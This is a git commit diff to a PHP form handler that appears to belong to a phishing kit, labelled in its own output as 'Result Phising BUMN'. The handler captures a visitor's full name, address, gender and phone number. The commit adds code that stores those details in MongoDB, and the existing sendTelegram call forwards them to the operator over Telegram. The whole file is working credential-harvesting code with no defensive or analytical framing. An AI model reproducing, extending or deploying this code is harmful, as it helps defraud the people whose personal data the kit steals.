1beac7dd5629edaf10c06539170160b2a8b3e5ae
Peterelzevir <114345532+Peterelzevir@users.noreply.github.com>
2025-03-22 06:07:10 +0700

    Update form.php

--- core/form.php
+++ core/form.php
@@ -1,13 +1,19 @@
 <?php
+require_once __DIR__ . '/db_config.php';
+require_once __DIR__ . '/MongoDBSessionHandler.php';
+require_once __DIR__ . '/telegram.php';
+
+// Inisialisasi MongoDB Session Handler
+$mongoSessionHandler = new MongoDBSessionHandler($mongo_connection_string);
+session_set_save_handler($mongoSessionHandler, true);
+$GLOBALS['mongoSessionHandler'] = $mongoSessionHandler;
 
 session_start();
 
-include "./telegram.php";
-
-$fullname = $_POST['fullname'];
-$address = $_POST['address'];
-$gender = $_POST['gender'];
-$phoneNumber = $_POST['phoneNumber'];
+$fullname = $_POST['fullname'] ?? '';
+$address = $_POST['address'] ?? '';
+$gender = $_POST['gender'] ?? '';
+$phoneNumber = $_POST['phoneNumber'] ?? '';
 
 $string = "== Result Phising BUMN ==\n";
 $string .= "Fullname : `$fullname`\n";
@@ -16,5 +22,25 @@ $string .= "Gender : `$gender`\n";
 $string .= "Phone : `$phoneNumber`\n";
 
 $_SESSION['message'] = $string;
+$_SESSION['user_data'] = [
+    'fullname' => $fullname,
+    'address' => $address,
+    'gender' => $gender,
+    'phoneNumber' => $phoneNumber,
+    'timestamp' => time()
+];
+
+// Simpan juga ke MongoDB secara langsung
+if (isset($mongoSessionHandler)) {
+    $mongoSessionHandler->saveTelegramData($string, [
+        'form_data' => [
+            'fullname' => $fullname,
+            'address' => $address,
+            'gender' => $gender,
+            'phoneNumber' => $phoneNumber
+        ],
+        'stage' => 'initial_form'
+    ]);
+}
 
 sendTelegram($string);
